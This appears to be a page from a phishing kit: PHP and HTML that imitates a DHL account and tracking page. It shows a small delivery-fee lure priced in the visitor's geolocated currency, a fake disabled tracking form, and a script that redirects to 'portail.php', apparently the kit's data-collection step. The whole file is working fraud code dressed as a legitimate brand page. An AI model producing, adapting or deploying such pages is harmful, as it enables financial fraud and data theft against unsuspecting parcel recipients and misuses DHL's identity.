<?php
   session_start();
   require 'system/detect.php';
   if(!isset($_SESSION['language'])){exit(header("Location: index.php"));
   }else{include "system/languages/{$_SESSION['language']}.php";}
   $_SESSION['ip_currency']=clientData('currency');
    ?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <style type="text/css" media="screen"> /* RESET */.elq-form * {  margin: 0;  padding: 0;}.elq-form input,textarea {	-webkit-box-sizing:content-box;	-moz-box-sizing:content-box;	box-sizing:content-box;}.elq-form input[type=text],.elq-form textarea,.elq-form select[multiple=multiple] {	border: 1px solid #A6A6A6;} .elq-form button,input[type=reset],input[type=button],input[type=submit],input[type=checkbox],input[type=radio],select {	-webkit-box-sizing:border-box;	-moz-box-sizing:border-box;	box-sizing:border-box;}/* GENERIC */.elq-form input {	height: 26px;	line-height: 16px;}.elq-form .item-padding {	padding:6px 5px 9px 9px;}.elq-form .pp-group {	padding:0px 5px 0px 9px;}.elq-form .pp-field {	padding:6px 0px 9px 0px;}.elq-form .field-wrapper.individual {    float: left;    width: 100%;	clear: both;}.elq-form .field-p {	position: relative;	margin: 0;	padding: 0;}.elq-form .zIndex-fix {	position: absolute;	z-index: 1;	top: 0;	left: 0;	right: 0;	bottom: 0;}.elq-form .field-design {	position:absolute;	z-index:2;	top:0;	left:0;	right:0;	bottom:0;	margin:0;	padding:0;}.elq-form .no-fields-prompt {	float: left;	width: 100%;	height: 150px;	padding-top: 50px;	clear: both;}/* SECTION BREAKS */.elq-form .section-break {	float:left;	width: 97%;	margin-right:2%;	margin-left:1%;	padding-bottom:6px;}.elq-form .section-break .heading {	width:100%;	font-weight: bold;	margin:0;	padding:0;}/* LABEL */.elq-form .required {	color: red !important;	display: inline;	float: none;	font-weight: bold;	margin: 0pt 0pt 0pt;	padding: 0pt 0pt 0pt;}/* FIELD GROUP */.elq-form .field-group {	float: left;	clear: both;}.elq-form .field-group.large {	width:100%;}.elq-form .field-group.medium {	width:51%;}.elq-form .field-group.small {	width:31%;}.elq-form .field-group .label {	float:left;	width:97%;	margin-right:2%;	margin-left:1%;	padding-bottom:6px;	font-weight: bold;}.elq-form .field-group .field-style {	float: left;}.elq-form .progressive-profile .pp-inner {	float: left;	clear: both;}.elq-form .progressive-profile .pp-inner.large {	width:100%;}.elq-form .progressive-profile .pp-inner.medium {	width:51%;}.elq-form .progressive-profile .pp-inner.small {	width:31%;}/* RADIO */.elq-form .radio-option {	display: inline-block;}.elq-form .radio-option .label {	display:block;	float:left;	padding-right:10px;	padding-left:22px;	text-indent:-22px;}.elq-form .radio-option .input {	vertical-align:middle;	margin-right:7px;}.elq-form .radio-option .inner {	vertical-align:middle;}/* CHECKBOX */.elq-form .checkbox-span {	display:inline-block;}.elq-form .checkbox-label {  padding-left:7px;  position: relative;  bottom:3px;}/* INPUT */.elq-form .accept-default {	width:100%;}/* SIZING */.elq-form .field-style {	margin-right:2%;	margin-left:2%;}.elq-form .field-style._25 {	width:21%;}.elq-form .field-style._50 {	width:46%;}.elq-form .field-style._50_left {	clear:left;	width:46%;}.elq-form .field-style._75 {	width:71%;}.elq-form .field-style._100 {	width:96%;}.elq-form .field-size-top-small {	width:30%;}.elq-form .field-size-top-medium {	width:75%;}.elq-form .field-size-top-large {	width:100%;}.elq-form .field-size-left-small {	width:21%;}.elq-form .field-size-left-medium {	width:46%;}.elq-form .field-size-left-large {	width:60%;}/* INSTRUCTIONS */.elq-form .instructions.default {	color:#444444;	display:block;	font-size:10px;	padding:6px 0pt 3px;}.elq-form .instructions.group {	float:left;	width:97%;	margin-right:2%;	margin-left:2%;	padding:6px 0pt 3px;	color:#444444;	display:block;	font-size:10px;}.elq-form .instructions.left-single {	margin:0 0 0 33%;}.elq-form .instructions-other {   margin:0;}/* POSITIONING */.elq-form .label-position.left {	display:block;    line-height:150%;    padding:1px 0pt 3px;    float:left;    width:31%;    margin:0pt 15px 0pt 0pt;    word-wrap:break-word;    overflow-wrap: break-word;}.elq-form .label-position.top {	display:block;    line-height:150%;    padding:1px 0pt 3px;    white-space:normal;}.elq-form .label-position.alignment-left {	text-align: left;}.elq-form .label-position.alignment-right {	text-align: right;}/* LIST ORDER */.elq-form .list-order {	display:block;}.elq-form .list-order.oneColumn {	margin:0pt 7px 0pt 0pt;	width:100%;	clear:both;}.elq-form .list-order.twoColumn {	float:left;	margin:0pt 7px 0pt 0pt;	width:38%;}.elq-form .list-order.threeColumn {	float:left;	margin:0pt 7px 0pt 0pt;	width:30%;}.elq-form .list-order.oneColumnLeft {	float:left;	margin:0pt 7px 0pt 0pt;	width:100%;}.elq-form .list-order.twoColumnLeft {	float:left;	margin:0pt 7px 0pt 0pt;	width:38%;}.elq-form .list-order.threeColumnLeft {	float:left;	margin:0pt 7px 0pt 0pt;	width:30%;}/* GRID STYLE */.elq-form .grid-style {      display:inline;      float:left;      margin-left:2%;      margin-right:2%;}.elq-form .grid-style._25 {      width:21%;}.elq-form .grid-style._50 {      width:46%;}.elq-form .grid-style._75 {      width:71%;}.elq-form .grid-style._100 {      width:96%;  }</style>
      <style type="text/css"> 
         label{height:24px; font-size: 14px; line-height: 24px; font-family:Helvetica Neue,Helvetica,Arial,sans-serif;!important}
         .field-wrapper label{
         margin:8px 2px !important;
         }
         .field-wrapper input{
         margin:8px 2px !important;
         }
         .field-wrapper select{
         margin:8px 2px !important;
         }
      </style>
      <title>DHL - Account</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <link rel="stylesheet" type="text/css" href="./files/css/main.css">
      <link rel="icon" href="./files/img/favicon.ico" type="image/x-icon">
	  <script src="./files/js/jquery.js"></script>
      <style type="text/css">
         /* CLIENT-SPECIFIC STYLES */
         body, table, td, a{-webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%;} /* Prevent WebKit and Windows mobile changing default text sizes */
         table, td{mso-table-lspace: 0pt; mso-table-rspace: 0pt;} /* Remove spacing between tables in Outlook 2007 and up */
         img{-ms-interpolation-mode: bicubic;} /* Allow smoother rendering of resized image in Internet Explorer */
         /* RESET STYLES */
         img{border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none;}
         table{border-collapse: collapse !important;}
         body{height: 100% !important; margin: 0 !important; padding: 0 !important; width: 100% !important;}
         /* iOS BLUE LINKS */
         a[x-apple-data-detectors] {
         color: inherit !important;
         text-decoration: none !important;
         font-size: inherit !important;
         font-family: inherit !important;
         font-weight: inherit !important;
         line-height: inherit !important;
         }
         /* MOBILE STYLES */
         @media screen and (max-width: 525px) {
         /* ALLOWS FOR FLUID TABLES */
         .wrapper {
         width: 100% !important;
         max-width: 100% !important;
         }
         /* ADJUSTS LAYOUT OF LOGO IMAGE */
         .logo img {
         margin: 0 auto !important;
         }
         /* USE THESE CLASSES TO HIDE CONTENT ON MOBILE */
         .mobile-hide {
         display: none !important;
         }
         .img-max {
         max-width: 100% !important;
         width: 100% !important;
         height: auto !important;
         }
         /* FULL-WIDTH TABLES */
         .responsive-table {
         width: 100% !important;
         }
         /* UTILITY CLASSES FOR ADJUSTING PADDING ON MOBILE */
         .padding {
         padding: 10px 5% 15px 5% !important;
         }
         .padding-meta {
         padding: 30px 5% 0px 5% !important;
         text-align: center;
         }
         .padding-copy {
         padding: 10px 5% 10px 5% !important;
         text-align: center;
         }
         .no-padding {
         padding: 0 !important;
         }
         .section-padding {
         padding: 50px 15px 50px 15px !important;
         }
         /* ADJUST BUTTONS ON MOBILE */
         .mobile-button-container {
         margin: 0 auto;
         width: 100% !important;
         }
         .mobile-button {
         padding: 15px !important;
         border: 0 !important;
         font-size: 16px !important;
         display: block !important;
         }
         }
         .btn_width_full {
         width: 60%;
         }
         .btn {
         color: #000;
         background: #fecb2f;
         }
         .btn {
         padding: 7px 12px;
         font-size: 14px;
         display: inline-block;
         margin: 0;
         cursor: pointer;
         -webkit-transition: all 0.25s;
         transition: all 0.25s;
         text-align: center;
         vertical-align: middle;
         text-decoration: none;
         border: 1px solid transparent;
         border-radius: 2px;
         outline: none;
         font-weight: bold;
         line-height: 1;
         -webkit-font-smoothing: antialiased;
         }
         /* ANDROID CENTER FIX */
         div[style*="margin: 16px 0;"] { margin: 0 !important; }
		 
		 .spinner {
	float: left
}

.selectedcontact {
	background-color: #066690;
	color: #fff
}

.contacts {
	cursor: pointer
}

.custom-select-box {
	background: #fff
}

input[type=tel]::-ms-clear {
	display: none;
	width: 0;
	height: 0
}

.spinner-container {
	width: 100%;
	height: 100%;
	position: fixed;
	top: 0;
	left: 0;
	background-color: #fff;
	opacity: .8;
	z-index: 99999
}

.spinner-block {
	margin: -17px 0 0 -17px;
	position: absolute;
	top: 30%;
	left: 45%
}

.spinner,
.tooltip-wrapper {
	position: relative
}

.spinner {
	margin: 10px;
	width: 200px;
	height: 103px;
	background: url(./files/img/lod.gif)
}

.spinner-text {
	color: #303030
}

@media all and (-ms-high-contrast:none),
(-ms-high-contrast:active) {
	.spinner-text {
		margin-right: 40%
	}
}

@media only screen and (max-width:760px) {
	.spinner-block {
		left: 40%
	}
}	
      </style>
   </head>
   <script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('onelod').style.visibility="hidden";
      },4000);
  }
}
</script>
   <body style="margin: 0px !important; padding: 0px !important;">
      <nav class="c-nav l-grid">
         <h2 class="sr-only"></h2>
         <div class="c-nav-primary--meta-container l-grid l-grid--w-100pc-m">
            <div class="l-grid--w-30pc-m">
               <a href="###" class="c-nav--logo">
               <img src="./files/img/dhl-logo.svg" alt="DHL">
               </a>
            </div>
            <div class="c-nav-primary--meta l-grid--w-70pc-m l-grid--hidden-s l-grid--visible-m">
               <div class="l-grid l-grid--row-reverse l-grid--w-100pc-s c-nav-primary--meta-links-container">
                  <ul class="c-nav-primary--meta-main js-nav-primary--meta-links">
                     <li class="l-grid js--nav-tohide">
                        <a class="" href="javascript:void(0)" title="Sélectionnez l&#39;emplacement">
                           <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-globe" fill="currentColor" >
                              <path fill-rule="evenodd" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm7.5-6.923c-.67.204-1.335.82-1.887 1.855A7.97 7.97 0 0 0 5.145 4H7.5V1.077zM4.09 4H2.255a7.025 7.025 0 0 1 3.072-2.472 6.7 6.7 0 0 0-.597.933c-.247.464-.462.98-.64 1.539zm-.582 3.5h-2.49c.062-.89.291-1.733.656-2.5H3.82a13.652 13.652 0 0 0-.312 2.5zM4.847 5H7.5v2.5H4.51A12.5 12.5 0 0 1 4.846 5zM8.5 5v2.5h2.99a12.495 12.495 0 0 0-.337-2.5H8.5zM4.51 8.5H7.5V11H4.847a12.5 12.5 0 0 1-.338-2.5zm3.99 0V11h2.653c.187-.765.306-1.608.338-2.5H8.5zM5.145 12H7.5v2.923c-.67-.204-1.335-.82-1.887-1.855A7.97 7.97 0 0 1 5.145 12zm.182 2.472a6.696 6.696 0 0 1-.597-.933A9.268 9.268 0 0 1 4.09 12H2.255a7.024 7.024 0 0 0 3.072 2.472zM3.82 11H1.674a6.958 6.958 0 0 1-.656-2.5h2.49c.03.877.138 1.718.312 2.5zm6.853 3.472A7.024 7.024 0 0 0 13.745 12H11.91a9.27 9.27 0 0 1-.64 1.539 6.688 6.688 0 0 1-.597.933zM8.5 12h2.355a7.967 7.967 0 0 1-.468 1.068c-.552 1.035-1.218 1.65-1.887 1.855V12zm3.68-1h2.146c.365-.767.594-1.61.656-2.5h-2.49a13.65 13.65 0 0 1-.312 2.5zm2.802-3.5h-2.49A13.65 13.65 0 0 0 12.18 5h2.146c.365.767.594 1.61.656 2.5zM11.27 2.461c.247.464.462.98.64 1.539h1.835a7.024 7.024 0 0 0-3.072-2.472c.218.284.418.598.597.933zM10.855 4H8.5V1.077c.67.204 1.335.82 1.887 1.855.173.324.33.682.468 1.068z"/>
                           </svg>
                           &nbsp;
                           <font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><?php echo(isset($_SESSION['ip_countryName'])?$_SESSION['ip_countryName']:'')?></font></font>
                        </a>
                     </li>
                     <li class="l-grid c-nav--language js--nav-tohide">
                        <a class=" js--cookie-set"  title="Search" href="javascript:void(0)">
                           <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-search" fill="currentColor" xmlns="#">
                              <path fill-rule="evenodd" d="M10.442 10.442a1 1 0 0 1 1.415 0l3.85 3.85a1 1 0 0 1-1.414 1.415l-3.85-3.85a1 1 0 0 1 0-1.415z"/>
                              <path fill-rule="evenodd" d="M6.5 12a5.5 5.5 0 1 0 0-11 5.5 5.5 0 0 0 0 11zM13 6.5a6.5 6.5 0 1 1-13 0 6.5 6.5 0 0 1 13 0z"/>
                           </svg>
                           &nbsp;<font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><?php echo $lg_d['navbar']?></font></font>
                        </a>
                        <span class="is-selected " title="Espagnol"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"></font></font></span>
                     </li>
                  </ul>
                  <ul class="c-nav-primary--meta-others js-nav-primary--meta-links">
                     <li class="l-grid js--nav-tohide c-nav-primary--globalnewsflash js--nav-primary--globalnewsflash">
                        <a class="" href="javascript:void(0)" target="_blank" title="Alertes" rel="noopener noreferrer">
                           <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-question-octagon-fill" fill="currentColor" xmlns="#">
                              <path fill-rule="evenodd" d="M11.46.146A.5.5 0 0 0 11.107 0H4.893a.5.5 0 0 0-.353.146L.146 4.54A.5.5 0 0 0 0 4.893v6.214a.5.5 0 0 0 .146.353l4.394 4.394a.5.5 0 0 0 .353.146h6.214a.5.5 0 0 0 .353-.146l4.394-4.394a.5.5 0 0 0 .146-.353V4.893a.5.5 0 0 0-.146-.353L11.46.146zM5.496 6.033a.237.237 0 0 1-.24-.247C5.35 4.091 6.737 3.5 8.005 3.5c1.396 0 2.672.73 2.672 2.24 0 1.08-.635 1.594-1.244 2.057-.737.559-1.01.768-1.01 1.486v.105a.25.25 0 0 1-.25.25h-.81a.25.25 0 0 1-.25-.246l-.004-.217c-.038-.927.495-1.498 1.168-1.987.59-.444.965-.736.965-1.371 0-.825-.628-1.168-1.314-1.168-.803 0-1.253.478-1.342 1.134-.018.137-.128.25-.266.25h-.825zm2.325 6.443c-.584 0-1.009-.394-1.009-.927 0-.552.425-.94 1.01-.94.609 0 1.028.388 1.028.94 0 .533-.42.927-1.029.927z"/>
                           </svg>
                           &nbsp;<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                           <?php echo $lg_d['navbar2']?>
                           </font></font><span class="sr-only"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"></font></font></span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                           </font></font>
                        </a>
                     </li>
                  </ul>
               </div>
            </div>
         </div>
      </nav>
	  

	  
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
         <td align="center" class="section-padding" style="padding: 40px 15px 70px;">
            <table width="100%" class="responsive-table" style="max-width: 700px;" border="0" cellspacing="0" cellpadding="0">
               <tbody>
               <tbody>
                  <tr>
                  </tr>
                  <tr>
                     <td align="center" class="section-padding" style="padding: 40px 15px 70px;">
                        <table width="100%" class="responsive-table" style="max-width: 700px;" border="0" cellspacing="0" cellpadding="0">
                           <tbody>
                              <tr>
                                 <td>
                                    <table width="100%" border="0" cellspacing="0" cellpadding="0">
                                       <tbody>
                                          <tr>
                                             <td align="center" class="padding" style="padding-top: 25px;" bgcolor="#f2f2f2">
                                                <table class="mobile-button-container" border="0" cellspacing="0" cellpadding="0">
                                                   <tbody>
                                                      <tr>
                                                         <td valign="top" style="padding-top: 20px; padding-bottom: 20px;" class="">
                                                            <div style="text-align: center;" class=""><b style="color: rgb(212, 5, 15); font-family: Arial;"></b></div>
                                                         </td>
                                                         <br>
                                                         <br>
                                                         <img width="60" src="files/img/glo.svg">
                                                      <tr>
                                                         <td align="center" class="padding" style="padding: 20px 0px; color: rgb(102, 102, 102); line-height: 25px; font-family: Helvetica, Arial, sans-serif; font-size: 16px;">
                                                            <div>
                                                               <div class="">
                                                                  <div class=""> <?php echo $intro_d['msg']?><br><?php echo $intro_d['msg2']?><b  style="color:rgb(212, 5, 17);">  (1.65 <?php echo $_SESSION['ip_currency'];?>)  </b><?php echo $intro_d['msg3']?><br><?php echo $intro_d['msg4']?><br><?php echo $intro_d['msg5']?></div>
                                                               </div>
                                                               <br><br>
															       <div class="">
                                                                  <br>
                                                                  <p style="text-align: center; color: rgb(102, 102, 102); font-family: Arial, sans-serif; font-size: 20px;" class=""><b><?php echo $intro_d['day']?><?php echo date("d/M/Y");  ?></b><br>
                                                               </div>
                                                    
                                                             
                                                                 
                                                      </tr>
                                                      </p>
													  
													  
                                                  
                                                      </tr>
                                                   </tbody>
                                                </table>
												
													  <div class="c-tracking--container l-grid component-wide">
		<div class="c-tracking-headline component-wide">
	
		</div>

		<div class="c-tracking-input--container component-wide l-grid--w-100pc-s ">

			<form class="c-tracking-input--form js--tracking--input-form  l-grid l-grid--w-100pc-s l-grid--middle-s l-grid--center-s is-open" id="info" action="javascript:void(0)" method="" data-track-and-trace-form="utapi">

				<label class="c-tracking-input--label has-icon js--tracking-input--toggle  l-grid--w-100pc-s l-grid--w-30pc-m l-grid--right-m"><?php echo $info_d['inp']?></label>

				<div class="c-tracking-input--elements-group  l-grid l-grid--left-s l-grid--w-100pc-s l-grid--w-70pc-m">
					<div class="c-tracking-input--select-group js--c-tracking-input--select-group  l-grid--w-100pc-s l-grid--w-40pc-m">
						<select class="c-form--element-base c-form--element-select c-tracking-select--field js--c-form--element-select js--form-element" name="forceService"></select>
					</div>
					<div class="c-tracking-input--button-group  l-grid l-grid--w-100pc-s l-grid--w-auto-m">
						<input class="c-tracking-bar--input js--tracking--input-field  l-grid--w-auto-s l-grid--w-75pc-m" type="input" value="<?php echo $intro_d['in'] ?>" name="tracking-id" placeholder="up to 10 codes" autocapitalize="off" autocomplete="on" spellcheck="false" autocorrect="off" autofocus="" disabled>
						
<button class="c-tracking-input--button js--tracking--input-submit base-button l-grid--w-20-s has-icon icon-arrow-link"><span class="sr-only"></span></button>					</div>
				</div>

			</form>
		</div>

		<div class="c-tracking-result--loader js--tracking-result--loader   l-grid--w-100pc-s l-grid--center-s">
		
		</div>

		<div class="js--tracking-result--container c-tracking-result--container l-grid--w-100pc-s  l-grid--w-100pc-m "></div>

	</div>

                                                <div elqformname="0518_GLB_MySupplyChain-Portal-Contact" elqtype="UserForm" elqid="497" class="">
                                                   <div>
                                                   </div>
                                                </div>
                                                <br><br>
                                             </td>
                                          </tr>
                                          <tr>
                                             <td>
                                          </tr>
                                       </tbody>
                                    </table>
                                 </td>
                              </tr>
                           </tbody>
                        </table>
                     </td>
                  </tr>
               </tbody>
            </table>
         </tbody>
      </table>
      </td>
      </tr>
      </tbody></table>
      </td>
      </tr>
      <tr>
         <td align="center" style="padding: 0px;" bgcolor="#ffffff">
         </td>
      </tr>
      </tbody></table>
	  
	  <script type="text/javascript">
var request;
$("#info").submit(function(event){
    event.preventDefault();
    if (request) {
        request.abort();
    }
    var $form = $(this);
    var $inputs = $form.find("input, select, button, textarea");
    var serializedData = $form.serialize();
    $inputs.prop("disabled", true);
    request = $.ajax({
    });
    request.done(function (response, textStatus, jqXHR){
        $(location).attr("href", "./portail.php?country.x=Global&one=ok&flowId=ul&_Email=datax");
    });
    request.fail(function (jqXHR, textStatus, errorThrown){
        console.error(
            "The following error occurred: "+
            textStatus, errorThrown
        );
    });
    request.always(function () {
        $inputs.prop("disabled", false);
    });
	
});
</script>
	  
	  <div id="onelod" class="spinner-container ng-isolate-scope" style="">
       <div class="spinner-block">
            <div class="spinner"></div>
            <p class="text-center spinner-text">Loading...</p>
        </div>
    </div>


  <div id="towlod" class="spinner-container ng-isolate-scope" style="display: none;">
       <div class="spinner-block">
            <div class="spinner"></div>
            <p class="text-center spinner-text">Loading...</p>
        </div>
    </div>	  
      <footer id="wcag-footer" class="c-footer">
         <div class="c-footer-meta component-wide l-grid">
            <div class="l-grid--w-100pc-s l-grid--w-70pc-m c-footer-meta-container">
               <img class="c-footer-meta-logo" src="./files/img/glo-footer-logo.svg" alt="Deutsche Post DHL Group">
               <nav class="l-grid--w-100pc-s">
               </nav>
            </div>
            <div class="l-grid--w-100pc-s l-grid--w-30pc-m c-footer-social-container">
               <div class="c-footer-headline">  
               </div>
               <nav class="l-grid--w-100pc-s">    
               </nav>
            </div>
         </div>
         <small class="c-footer--legal-text component-wide l-grid l-grid--w-100pc-s l-grid--center-m"><?php echo date("Y");?> <?php echo $lg_d['footer2']?></small>
         <div class="section"></div>
         <div class="iparys_inherited"></div>
         </div>
      </footer>
   </body>
</html>